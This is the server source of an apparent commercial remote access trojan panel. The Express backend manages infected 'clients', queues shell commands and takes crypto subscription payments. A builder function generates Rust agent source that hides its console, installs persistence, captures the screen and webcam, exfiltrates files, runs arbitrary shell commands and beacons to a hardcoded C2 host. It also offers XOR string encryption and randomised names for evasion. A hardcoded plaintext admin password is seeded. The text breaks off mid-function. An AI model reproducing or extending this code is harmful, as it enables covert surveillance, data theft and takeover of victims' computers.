require("dotenv").config({ path: require("path").join(__dirname, ".env") });
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const express = require("express");
const cookieParser = require("cookie-parser");
const mysql = require("mysql2/promise");
const multer = require("multer");

function requireEnv(name) {
  const v = process.env[name];
  if (!v) { console.error(`[veltrix] Missing required env var: ${name}`); process.exit(1); }
  return v;
}

const app = express();
const PORT = process.env.VELTRIX_PORT || process.env.HC_PORT || 3001;

// ── Builder key (shared secret with buildserver/app.py) ──
const BUILDER_KEY = requireEnv("VELTRIX_BUILDER_KEY");

// Multer for exe uploads from build server
const upload = multer({ dest: path.join(__dirname, "uploads_tmp"), limits: { fileSize: 50 * 1024 * 1024 } });

// --- MySQL ---
const pool = mysql.createPool({
  host: requireEnv("DB_HOST"),
  port: Number(process.env.DB_PORT || 3306),
  user: requireEnv("DB_USER"),
  password: requireEnv("DB_PASSWORD"),
  database: requireEnv("DB_NAME"),
  waitForConnections: true,
  connectionLimit: Number(process.env.DB_POOL || 5),
});

async function initDb() {
  const conn = await pool.getConnection();
  try {
    await conn.query(`CREATE TABLE IF NOT EXISTS accounts (
      id INT AUTO_INCREMENT PRIMARY KEY,
      username VARCHAR(64) UNIQUE NOT NULL,
      password VARCHAR(255) NOT NULL,
      auth_key VARCHAR(64) UNIQUE NOT NULL,
      is_admin BOOLEAN DEFAULT FALSE,
      webhook_url VARCHAR(512) DEFAULT NULL,
      sub_expires BIGINT DEFAULT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS clients (
      id VARCHAR(32) PRIMARY KEY,
      name VARCHAR(128) NOT NULL,
      user VARCHAR(64),
      os VARCHAR(128),
      ip VARCHAR(45),
      country VARCHAR(64),
      country_code VARCHAR(4),
      status ENUM('online','offline','idle') DEFAULT 'online',
      last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      cpu VARCHAR(128),
      ram VARCHAR(32),
      gpu VARCHAR(128),
      uptime VARCHAR(32),
      grp VARCHAR(64),
      av VARCHAR(64),
      net_speed VARCHAR(32),
      installed DATE,
      owner_id INT,
      FOREIGN KEY (owner_id) REFERENCES accounts(id) ON DELETE CASCADE
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS logs (
      id INT AUTO_INCREMENT PRIMARY KEY,
      type ENUM('info','warn','success','error') DEFAULT 'info',
      msg TEXT,
      ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS builds (
      id INT AUTO_INCREMENT PRIMARY KEY,
      owner_id INT,
      build_name VARCHAR(128),
      startup BOOLEAN DEFAULT FALSE,
      debug BOOLEAN DEFAULT FALSE,
      poly_encrypt BOOLEAN DEFAULT FALSE,
      string_random BOOLEAN DEFAULT FALSE,
      c2_url VARCHAR(255),
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (owner_id) REFERENCES accounts(id) ON DELETE CASCADE
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS pending_commands (
      id INT AUTO_INCREMENT PRIMARY KEY,
      client_id VARCHAR(32),
      command TEXT,
      owner_id INT,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS command_results (
      id INT AUTO_INCREMENT PRIMARY KEY,
      client_id VARCHAR(32),
      command TEXT,
      result LONGTEXT,
      owner_id INT,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS orders (
      id INT AUTO_INCREMENT PRIMARY KEY,
      order_id VARCHAR(64) UNIQUE NOT NULL,
      owner_id INT,
      plan_id VARCHAR(32) NOT NULL,
      plan_name VARCHAR(64) NOT NULL,
      crypto VARCHAR(8) NOT NULL,
      amount VARCHAR(32) NOT NULL,
      address VARCHAR(255) NOT NULL,
      status ENUM('pending','verified','expired') DEFAULT 'pending',
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      verified_at TIMESTAMP NULL,
      FOREIGN KEY (owner_id) REFERENCES accounts(id) ON DELETE CASCADE
    )`);

    // Add missing columns safely
    const addCol = async (table, col, def) => { try { await conn.query(`ALTER TABLE ${table} ADD COLUMN ${col} ${def}`); } catch {} };
    await addCol("accounts", "webhook_url", "VARCHAR(512) DEFAULT NULL");
    await addCol("accounts", "auth_key", "VARCHAR(64) UNIQUE");
    await addCol("accounts", "is_admin", "BOOLEAN DEFAULT FALSE");
    await addCol("accounts", "sub_expires", "BIGINT DEFAULT NULL");
    await addCol("builds", "poly_encrypt", "BOOLEAN DEFAULT FALSE");
    await addCol("builds", "string_random", "BOOLEAN DEFAULT FALSE");
    await addCol("builds", "status", "ENUM('compiling','compiled','failed') DEFAULT 'compiling'");
    await addCol("builds", "exe_path", "VARCHAR(512) DEFAULT NULL");
    await addCol("builds", "exe_size", "INT DEFAULT 0");
    await addCol("builds", "sources_json", "LONGTEXT DEFAULT NULL");


    // Backfill auth_key
    try {
      const [noKey] = await conn.query("SELECT id FROM accounts WHERE auth_key IS NULL");
      for (const row of noKey) {
        const key = "HC-" + crypto.randomBytes(16).toString("hex").toUpperCase();
        await conn.query("UPDATE accounts SET auth_key = ? WHERE id = ?", [key, row.id]);
      }
    } catch {}

    // Seed jayjay as ADMIN if no accounts exist
    const [rows] = await conn.query("SELECT COUNT(*) as cnt FROM accounts");
    if (rows[0].cnt === 0) {
      const key1 = "HC-" + crypto.randomBytes(16).toString("hex").toUpperCase();
      await conn.query(
        "INSERT INTO accounts (id, username, password, auth_key, is_admin, sub_expires) VALUES (1, 'jayjay', 'jayjay100!', ?, TRUE, -1)",
        [key1]
      );
      await conn.query(`INSERT INTO clients (id, name, user, os, ip, country, country_code, status, cpu, ram, gpu, uptime, grp, av, net_speed, installed, owner_id) VALUES
        ('HC-9F21A','DESKTOP-JAY','jay','Windows 11 Pro','192.168.1.42','Sweden','SE','online','Intel i7-13700K','32 GB','RTX 4070 Ti','3h 12m','Personal','Windows Defender','85 Mbps','2025-12-01',1),
        ('HC-3B7E2','LAPTOP-ADMIN','admin','Windows 10 Enterprise','10.0.0.15','Germany','DE','online','AMD Ryzen 9 5900X','64 GB','RX 6800 XT','14h 42m','Work','Kaspersky','120 Mbps','2025-11-18',1),
        ('HC-CC291','PC-GAMING','player1','Windows 11 Home','192.168.3.200','Japan','JP','idle','Intel i9-14900K','64 GB','RTX 4090','1h 5m','Personal','Bitdefender','200 Mbps','2026-03-02',1)
      `);
      await conn.query("INSERT INTO logs (type, msg) VALUES ('info','Panel started'),('info','System initialized — admin: jayjay')");
    } else {
      // Make sure jayjay is admin
      await conn.query("UPDATE accounts SET is_admin = TRUE WHERE username = 'jayjay'");
    }
  } finally {
    conn.release();
  }
}

async function addLog(type, msg) {
  try { await pool.query("INSERT INTO logs (type, msg) VALUES (?, ?)", [type, msg]); } catch {}
}

// --- Discord webhook ---
async function sendWebhook(userId, embed) {
  try {
    const [rows] = await pool.query("SELECT webhook_url FROM accounts WHERE id = ?", [userId]);
    const url = rows[0]?.webhook_url;
    if (!url) return;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
    });
  } catch {}
}

// --- Session management ---
const SESSION_MAX_AGE_MS = 1000 * 60 * 60 * 12;
const SESSION_IDLE_MS = 1000 * 60 * 30;
const LOGIN_MAX_ATTEMPTS = 5;
const LOGIN_WINDOW_MS = 1000 * 60 * 10;
const sessions = new Map();
const loginAttempts = new Map();

function clientIp(req) {
  return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "unknown";
}

function isAuthed(req) {
  const sid = req.cookies && req.cookies.hc_session;
  if (!sid) return null;
  const s = sessions.get(sid);
  if (!s) return null;
  const now = Date.now();
  if (now - s.createdAt > SESSION_MAX_AGE_MS || now - s.lastSeen > SESSION_IDLE_MS) {
    sessions.delete(sid);
    return null;
  }
  s.lastSeen = now;
  return { sid, session: s };
}

function requireAuth(req, res, next) {
  const auth = isAuthed(req);
  if (!auth) return res.status(401).json({ ok: false, error: "Unauthorized" });
  req.auth = auth;
  next();
}

function requireCsrf(req, res, next) {
  const header = req.headers["x-csrf-token"];
  if (!header || header !== req.auth.session.csrf) {
    return res.status(403).json({ ok: false, error: "Invalid CSRF token" });
  }
  next();
}

function requireActiveSub(req, res, next) {
  const s = req.auth.session;
  if (s.isAdmin) return next();
  if (s.subExpires === -1) return next(); // lifetime
  if (s.subExpires && s.subExpires > Date.now()) return next();
  return res.status(403).json({ ok: false, error: "Subscription expired. Please renew." });
}

// ── Builder auth middleware ──
function requireBuilderKey(req, res, next) {
  const key = req.headers["x-builder-key"];
  if (!key || !crypto.timingSafeEqual(Buffer.from(key), Buffer.from(BUILDER_KEY))) {
    return res.status(401).json({ ok: false, error: "Invalid builder key" });
  }
  next();
}

// Security headers
app.use((req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.setHeader("X-XSS-Protection", "1; mode=block");
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
  next();
});

app.use(express.json({ limit: "64kb" }));
app.use(cookieParser());

// --- Login ---
app.post("/api/login", async (req, res) => {
  const ip = clientIp(req);
  const now = Date.now();
  let entry = loginAttempts.get(ip);
  if (entry && entry.lockedUntil && entry.lockedUntil > now) {
    const secs = Math.ceil((entry.lockedUntil - now) / 1000);
    return res.status(429).json({ ok: false, error: `Too many attempts. Try again in ${secs}s.` });
  }
  const { username = "", password = "" } = req.body || {};
  try {
    const [rows] = await pool.query("SELECT id, username, password, is_admin, sub_expires FROM accounts WHERE username = ?", [username]);
    const account = rows[0];
    if (!account || account.password !== password) {
      if (!entry || now - entry.firstAt > LOGIN_WINDOW_MS) {
        entry = { count: 1, firstAt: now, lockedUntil: 0 };
      } else {
        entry.count += 1;
        if (entry.count >= LOGIN_MAX_ATTEMPTS) entry.lockedUntil = now + LOGIN_WINDOW_MS;
      }
      loginAttempts.set(ip, entry);
      await addLog("warn", `Failed login from ${ip} (attempt ${entry.count}/${LOGIN_MAX_ATTEMPTS})`);
      return res.status(401).json({ ok: false, error: "Invalid credentials" });
    }
    loginAttempts.delete(ip);
    const sid = crypto.randomBytes(32).toString("hex");
    const csrf = crypto.randomBytes(24).toString("hex");
    const subExp = account.sub_expires ? Number(account.sub_expires) : null;
    sessions.set(sid, {
      user: account.username,
      userId: account.id,
      isAdmin: !!account.is_admin,
      subExpires: subExp,
      createdAt: now,
      lastSeen: now,
      csrf,
      ip,
    });
    res.cookie("hc_session", sid, { httpOnly: true, sameSite: "lax", maxAge: SESSION_MAX_AGE_MS, path: "/" });
    res.cookie("hc_csrf", csrf, { httpOnly: false, sameSite: "lax", maxAge: SESSION_MAX_AGE_MS, path: "/" });
    await addLog("success", `Login: ${account.username} (uid:${account.id}) from ${ip}`);
    res.json({ ok: true, user: account.username, userId: account.id, csrf, isAdmin: !!account.is_admin, subExpires: subExp });
  } catch (err) {
    console.error("Login error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/logout", (req, res) => {
  const sid = req.cookies && req.cookies.hc_session;
  if (sid) sessions.delete(sid);
  res.clearCookie("hc_session");
  res.clearCookie("hc_csrf");
  res.json({ ok: true });
});

// --- Signup ---
app.post("/api/signup", async (req, res) => {
  const { username = "", password = "" } = req.body || {};
  if (!username || username.length < 3 || username.length > 32) {
    return res.status(400).json({ ok: false, error: "Username must be 3-32 characters" });
  }
  if (!password || password.length < 6) {
    return res.status(400).json({ ok: false, error: "Password must be at least 6 characters" });
  }
  if (!/^[a-zA-Z0-9_]+$/.test(username)) {
    return res.status(400).json({ ok: false, error: "Username can only contain letters, numbers, and underscores" });
  }
  try {
    const [existing] = await pool.query("SELECT id FROM accounts WHERE username = ?", [username]);
    if (existing.length > 0) {
      return res.status(409).json({ ok: false, error: "Username already taken" });
    }
    const authKey = "HC-" + crypto.randomBytes(16).toString("hex").toUpperCase();
    await pool.query("INSERT INTO accounts (username, password, auth_key, is_admin, sub_expires) VALUES (?, ?, ?, FALSE, NULL)", [username, password, authKey]);
    await addLog("success", `New account registered: ${username}`);
    res.json({ ok: true, authKey });
  } catch (err) {
    console.error("Signup error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Auth key login ---
app.post("/api/login-authkey", async (req, res) => {
  const ip = clientIp(req);
  const now = Date.now();
  let entry = loginAttempts.get(ip);
  if (entry && entry.lockedUntil && entry.lockedUntil > now) {
    const secs = Math.ceil((entry.lockedUntil - now) / 1000);
    return res.status(429).json({ ok: false, error: `Too many attempts. Try again in ${secs}s.` });
  }
  const { authKey = "" } = req.body || {};
  try {
    const [rows] = await pool.query("SELECT id, username, is_admin, sub_expires FROM accounts WHERE auth_key = ?", [authKey]);
    const account = rows[0];
    if (!account) {
      if (!entry || now - entry.firstAt > LOGIN_WINDOW_MS) {
        entry = { count: 1, firstAt: now, lockedUntil: 0 };
      } else {
        entry.count += 1;
        if (entry.count >= LOGIN_MAX_ATTEMPTS) entry.lockedUntil = now + LOGIN_WINDOW_MS;
      }
      loginAttempts.set(ip, entry);
      return res.status(401).json({ ok: false, error: "Invalid auth key" });
    }
    loginAttempts.delete(ip);
    const sid = crypto.randomBytes(32).toString("hex");
    const csrf = crypto.randomBytes(24).toString("hex");
    const subExp = account.sub_expires ? Number(account.sub_expires) : null;
    sessions.set(sid, {
      user: account.username,
      userId: account.id,
      isAdmin: !!account.is_admin,
      subExpires: subExp,
      createdAt: now,
      lastSeen: now,
      csrf,
      ip,
    });
    res.cookie("hc_session", sid, { httpOnly: true, sameSite: "lax", maxAge: SESSION_MAX_AGE_MS, path: "/" });
    res.cookie("hc_csrf", csrf, { httpOnly: false, sameSite: "lax", maxAge: SESSION_MAX_AGE_MS, path: "/" });
    await addLog("success", `Auth key login: ${account.username} from ${ip}`);
    res.json({ ok: true, user: account.username, userId: account.id, csrf, isAdmin: !!account.is_admin, subExpires: subExp });
  } catch (err) {
    console.error("Auth key login error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.get("/api/me", (req, res) => {
  const auth = isAuthed(req);
  if (!auth) return res.status(401).json({ ok: false });
  const s = auth.session;
  res.json({ ok: true, user: s.user, userId: s.userId, csrf: s.csrf, isAdmin: s.isAdmin, subExpires: s.subExpires });
});

// --- Stats (requires active sub) ---
app.get("/api/stats", requireAuth, requireActiveSub, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [clients] = await pool.query("SELECT * FROM clients WHERE owner_id = ?", [uid]);
    const online = clients.filter(c => c.status === "online").length;
    const offline = clients.filter(c => c.status === "offline").length;
    const idle = clients.filter(c => c.status === "idle").length;
    const countries = [...new Set(clients.map(c => c.country))].length;
    const [buildRows] = await pool.query("SELECT COUNT(*) as cnt FROM builds WHERE owner_id = ?", [uid]);
    res.json({
      ok: true,
      analytics: { total: clients.length, online, offline, idle, countries, newToday: 0, commandsSent: 0, builds: buildRows[0].cnt },
      clients: clients.map(c => ({
        id: c.id, name: c.name, user: c.user, os: c.os, ip: c.ip,
        country: c.country, countryCode: c.country_code, status: c.status,
        lastSeen: c.last_seen ? new Date(c.last_seen).toISOString() : "unknown",
        cpu: c.cpu, ram: c.ram, gpu: c.gpu, uptime: c.uptime,
        group: c.grp, av: c.av, netSpeed: c.net_speed,
        installed: c.installed ? new Date(c.installed).toISOString().split("T")[0] : "",
      })),
    });
  } catch (err) {
    console.error("Stats error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Settings ---
app.get("/api/settings", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [rows] = await pool.query("SELECT webhook_url FROM accounts WHERE id = ?", [uid]);
    res.json({ ok: true, webhookUrl: rows[0]?.webhook_url || "" });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/settings", requireAuth, requireCsrf, async (req, res) => {
  const uid = req.auth.session.userId;
  const { webhookUrl = "" } = req.body || {};
  try {
    await pool.query("UPDATE accounts SET webhook_url = ? WHERE id = ?", [webhookUrl || null, uid]);
    await addLog("info", `Settings updated by ${req.auth.session.user}`);
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/settings/test-webhook", requireAuth, requireCsrf, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    await sendWebhook(uid, {
      title: "Webhook Test",
      description: `Test notification from **${req.auth.session.user}**`,
      color: 0x00d4aa,
      timestamp: new Date().toISOString(),
    });
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "Webhook failed" });
  }
});

// --- Logs ---
app.get("/api/logs", requireAuth, async (req, res) => {
  try {
    const [logs] = await pool.query("SELECT * FROM logs ORDER BY ts DESC LIMIT 200");
    res.json({ ok: true, logs: logs.map(l => ({ id: String(l.id), type: l.type, msg: l.msg, ts: new Date(l.ts).getTime() })) });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/logs", requireAuth, requireCsrf, async (req, res) => {
  try {
    await pool.query("DELETE FROM logs");
    await addLog("info", `Logs cleared by ${req.auth.session.user}`);
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Client detail (requires active sub) ---
app.get("/api/client/:id", requireAuth, requireActiveSub, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [rows] = await pool.query("SELECT * FROM clients WHERE id = ? AND owner_id = ?", [req.params.id, uid]);
    if (!rows.length) return res.status(404).json({ ok: false });
    const c = rows[0];
    const [results] = await pool.query(
      "SELECT * FROM command_results WHERE client_id = ? AND owner_id = ? ORDER BY created_at DESC LIMIT 50",
      [c.id, uid]
    );
    await addLog("info", `${req.auth.session.user} connected to ${c.name}`);
    res.json({
      ok: true,
      client: {
        id: c.id, name: c.name, user: c.user, os: c.os, ip: c.ip,
        country: c.country, countryCode: c.country_code, status: c.status,
        lastSeen: c.last_seen ? new Date(c.last_seen).toISOString() : "unknown",
        cpu: c.cpu, ram: c.ram, gpu: c.gpu, uptime: c.uptime,
        group: c.grp, av: c.av, netSpeed: c.net_speed,
        installed: c.installed ? new Date(c.installed).toISOString().split("T")[0] : "",
      },
      files: [
        { name: "Desktop", type: "folder", size: "-", modified: "2026-08-19" },
        { name: "Documents", type: "folder", size: "-", modified: "2026-08-20" },
        { name: "Downloads", type: "folder", size: "-", modified: "2026-08-18" },
        { name: "AppData", type: "folder", size: "-", modified: "2026-08-20" },
        { name: "Pictures", type: "folder", size: "-", modified: "2026-08-15" },
      ],
      processes: [
        { pid: 4, name: "System", cpu: "0.1%", mem: "12 MB", status: "running" },
        { pid: 124, name: "explorer.exe", cpu: "1.2%", mem: "82 MB", status: "running" },
        { pid: 3200, name: "chrome.exe", cpu: "8.4%", mem: "640 MB", status: "running" },
        { pid: 1844, name: "svchost.exe", cpu: "0.3%", mem: "24 MB", status: "running" },
        { pid: 5120, name: "discord.exe", cpu: "2.1%", mem: "210 MB", status: "running" },
        { pid: 7704, name: "spotify.exe", cpu: "1.8%", mem: "185 MB", status: "running" },
      ],
      commandHistory: results.map(r => ({
        command: r.command,
        result: r.result,
        ts: new Date(r.created_at).getTime(),
      })),
    });
  } catch (err) {
    console.error("Client error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Command (requires active sub) ---
app.post("/api/command/:id", requireAuth, requireCsrf, requireActiveSub, async (req, res) => {
  const uid = req.auth.session.userId;
  const [rows] = await pool.query("SELECT * FROM clients WHERE id = ? AND owner_id = ?", [req.params.id, uid]);
  if (!rows.length) return res.status(404).json({ ok: false });
  const { action, shell } = req.body || {};

  if (shell && typeof shell === "string" && shell.length <= 4096) {
    try {
      await pool.query("INSERT INTO pending_commands (client_id, command, owner_id) VALUES (?, ?, ?)", [req.params.id, shell, uid]);
      await addLog("info", `Shell command queued for ${rows[0].name} by ${req.auth.session.user}`);
      const simResult = `[simulated] $ ${shell}\nCommand queued for execution on next agent check-in.`;
      await pool.query("INSERT INTO command_results (client_id, command, result, owner_id) VALUES (?, ?, ?, ?)",
        [req.params.id, shell, simResult, uid]);
      return res.json({ ok: true, result: simResult });
    } catch {
      return res.status(500).json({ ok: false, error: "Failed to queue command" });
    }
  }

  if (typeof action !== "string" || action.length > 64) {
    return res.status(400).json({ ok: false, error: "Invalid action" });
  }
  await addLog("info", `Command "${action}" sent to ${rows[0].name} by ${req.auth.session.user}`);
  res.json({ ok: true, result: `Command "${action}" executed on ${rows[0].name}` });
});

// --- Polymorphic string encryption helpers ---
function xorEncrypt(str, key) {
  const buf = Buffer.from(str, "utf8");
  const keyBuf = Buffer.from(key, "utf8");
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) {
    out[i] = buf[i] ^ keyBuf[i % keyBuf.length];
  }
  return Array.from(out);
}

function randomVarName() {
  const chars = "abcdefghijklmnopqrstuvwxyz";
  let name = "_";
  for (let i = 0; i < 8 + Math.floor(Math.random() * 8); i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }
  return name;
}

function randomString(len) {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let s = "";
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
  return s;
}

// --- Build ---
function generateRustSource(userId, buildName, startup, debug, polyEncrypt, stringRandom) {
  const c2Url = `https://windowssys.hidenmc.com/${userId}`;
  const encKey = randomString(16);

  const vC2 = stringRandom ? randomVarName() : "C2_URL";
  const vUID = stringRandom ? randomVarName() : "USER_ID";
  const vDelay = stringRandom ? randomVarName() : "RECONNECT_DELAY";
  const vMutex = stringRandom ? randomVarName() : "MUTEX_NAME";
  const fnCheckIn = stringRandom ? randomVarName() : "check_in";
  const fnSendResult = stringRandom ? randomVarName() : "send_result";
  const fnExecCmd = stringRandom ? randomVarName() : "execute_command";
  const fnMachineId = stringRandom ? randomVarName() : "machine_id";

  let c2Decl, mutexDecl;
  if (polyEncrypt) {
    const c2Bytes = xorEncrypt(c2Url, encKey);
    const mutexBytes = xorEncrypt(buildName, encKey);
    c2Decl = `const ${vC2}_ENC: [u8; ${c2Bytes.length}] = [${c2Bytes.join(",")}];
const ${vC2}_KEY: &[u8] = b"${encKey}";

fn ${stringRandom ? randomVarName() : "decrypt"}(data: &[u8], key: &[u8]) -> String {
    data.iter().enumerate().map(|(i, b)| (b ^ key[i % key.len()]) as char).collect()
}

lazy_static::lazy_static! {
    static ref ${vC2}: String = ${stringRandom ? randomVarName() : "decrypt"}(&${vC2}_ENC, ${vC2}_KEY);
    static ref ${vMutex}: String = ${stringRandom ? randomVarName() : "decrypt"}(&[${mutexBytes.join(",")}], ${vC2}_KEY);
}`;
    mutexDecl = "";
  } else {
    c2Decl = `const ${vC2}: &str = "${c2Url}";`;
    mutexDecl = `const ${vMutex}: &str = "${buildName}";`;
  }

  const lazyRef = polyEncrypt ? `${vC2}.as_str()` : vC2;
  const mutexRef = polyEncrypt ? `${vMutex}.as_str()` : vMutex;

  return `// ${stringRandom ? randomString(12) : buildName}
// Built: ${new Date().toISOString()}
${polyEncrypt ? "" : `// C2: ${c2Url}`}

use std::{thread, time::Duration, process::Command};
${polyEncrypt ? "use lazy_static;" : ""}

${c2Decl}
${mutexDecl}
const ${vUID}: u32 = ${userId};
const ${vDelay}: u64 = 5;

${startup ? `mod persistence;` : ""}
mod screen;
mod camera;
mod filemanager;

fn main() {
    let _lock = single_instance::SingleInstance::new(${mutexRef})
        .expect("${stringRandom ? randomString(20) : "Another instance is already running"}");

${startup ? `    persistence::install(${mutexRef}, &format!("{}\\\\Microsoft\\\\{}.exe", std::env::var("APPDATA").unwrap_or_default(), ${mutexRef}));` : ""}
${!debug ? `    #[cfg(windows)]
    unsafe {
        winapi::um::wincon::FreeConsole();
    }` : `    println!("[*] Agent starting...");
    println!("[*] C2: {}", ${lazyRef});
    println!("[*] UID: {}", ${vUID});`}

    loop {
        match ${fnCheckIn}() {
            Ok(cmd) => {
                if !cmd.trim().is_empty() {
                    let result = handle_command(&cmd);
                    let _ = ${fnSendResult}(&cmd, &result);
${debug ? `                    println!("[>] {}", cmd);
                    println!("[<] {}...", &result[..result.len().min(200)]);` : ""}
                }
            }
            Err(_e) => {
${debug ? `                eprintln!("[!] Check-in failed: {}", _e);` : ""}
            }
        }
        thread::sleep(Duration::from_secs(${vDelay}));
    }
}

fn handle_command(cmd: &str) -> String {
    let parts: Vec<&str> = cmd.splitn(2, ' ').collect();
    let action = parts[0];
    let arg = parts.get(1).copied().unwrap_or("");

    match action {
        "screenshot" => {
            let quality: u8 = arg.parse().unwrap_or(75);
            match screen::capture_screen_b64(quality) {
                Ok(b64) => format!("SCREEN:{}", b64),
                Err(e) => format!("ERROR:{}", e),
            }
        }
        "camera" => {
            let quality: u8 = arg.parse().unwrap_or(75);
            match camera::capture_camera_b64(quality) {
                Ok(b64) => format!("CAMERA:{}", b64),
                Err(e) => format!("ERROR:{}", e),
            }
        }
        "ls" => {
            let path = if arg.is_empty() { "C:\\\\" } else { arg };
            match filemanager::list_dir(path) {
                Ok(json) => format!("FILES:{}", json),
                Err(e) => format!("ERROR:{}", e),
            }
        }
        "download" => {
            if arg.is_empty() {
                "ERROR:No file path specified".to_string()
            } else {
                match filemanager::read_file_b64(arg) {
                    Ok(b64) => format!("FILE:{}:{}", arg, b64),
                    Err(e) => format!("ERROR:{}", e),
                }
            }
        }
        _ => execute_shell(cmd),
    }
}

fn execute_shell(cmd: &str) -> String {
    #[cfg(windows)]
    {
        match Command::new("cmd").args(&["/C", cmd]).output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                format!("{}{}", stdout, stderr)
            }
            Err(e) => format!("Error: {}", e),
        }
    }
    #[cfg(not(windows))]
    {
        match Command::new("sh").args(&["-c", cmd]).output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                format!("{}{}", stdout, stderr)
            }
            Err(e) => format!("Error: {}", e),
        }
    }
}

fn ${fnCheckIn}() -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let resp = client
        .get(&format!("{}/checkin", ${lazyRef}))
        .header("X-Client-ID", ${fnMachineId}())
        .header("X-User-ID", ${vUID}.to_string())
        .header("X-Hostname", hostname())
        .header("X-OS", std::env::consts::OS)
        .send()?;
    Ok(resp.text()?)
}

fn ${fnSendResult}(cmd: &str, result: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    client
        .post(&format!("{}/result", ${lazyRef}))
        .header("X-Client-ID", ${fnMachineId}())
        .header("X-User-ID", ${vUID}.to_string())
        .header("Content-Type", "application/json")
        .body(format!(r#"{{"command":"{}","result":"{}"}}"#, cmd.replace('"', r#"\\""#), result.replace('"', r#"\\""#)))
        .send()?;
    Ok(())
}

fn ${fnMachineId}() -> String {
    machine_uid::get().unwrap_or_else(|_| "${stringRandom ? randomString(8) : "unknown"}".to_string())
}

fn hostname() -> String {
    #[cfg(windows)]
    { std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string()) }
    #[cfg(not(windows))]
    { std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".to_string()) }
}
`;
}

function generateCargoToml(buildName, startup, polyEncrypt, debug) {
  let deps = `[package]
name = "${buildName}"
version = "0.2.0"
edition = "2021"

[dependencies]
reqwest = { version = "0.11", features = ["blocking", "json", "multipart"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
single-instance = "0.3"
machine-uid = "0.5"
screenshots = "0.8"
nokhwa = { version = "0.10", features = ["input-native"] }
image = "0.25"
base64 = "0.22"
walkdir = "2"
`;
  if (polyEncrypt) deps += `lazy_static = "1.4"\n`;
  if (!debug) deps += `winapi = { version = "0.3", features = ["wincon"] }\n`;

  deps += `
[profile.release]
opt-level = "s"
lto = true
strip = true
panic = "abort"
`;
  return deps;
}

// --- Delete build ---
app.delete("/api/build/:id", requireAuth, requireCsrf, async (req, res) => {
  const uid = req.auth.session.userId;
  const buildId = parseInt(req.params.id, 10);
  try {
    const [rows] = await pool.query("SELECT exe_path FROM builds WHERE id = ? AND owner_id = ?", [buildId, uid]);
    if (!rows.length) return res.status(404).json({ ok: false, error: "Build not found" });
    // Delete exe file if exists
    if (rows[0].exe_path) {
      try { fs.unlinkSync(rows[0].exe_path); } catch {}
    }
    await pool.query("DELETE FROM builds WHERE id = ? AND owner_id = ?", [buildId, uid]);
    await addLog("info", `Build #${buildId} deleted by ${req.auth.session.user}`);
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Download build exe ---
app.get("/api/build/:id/download", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  const buildId = parseInt(req.params.id, 10);
  try {
    const [rows] = await pool.query("SELECT build_name, exe_path, status FROM builds WHERE id = ? AND owner_id = ?", [buildId, uid]);
    if (!rows.length) return res.status(404).json({ ok: false, error: "Build not found" });
    if (rows[0].status !== "compiled" || !rows[0].exe_path) return res.status(400).json({ ok: false, error: "Build not ready" });
    if (!fs.existsSync(rows[0].exe_path)) return res.status(404).json({ ok: false, error: "File not found" });
    res.download(rows[0].exe_path, `${rows[0].build_name}.exe`);
  } catch {
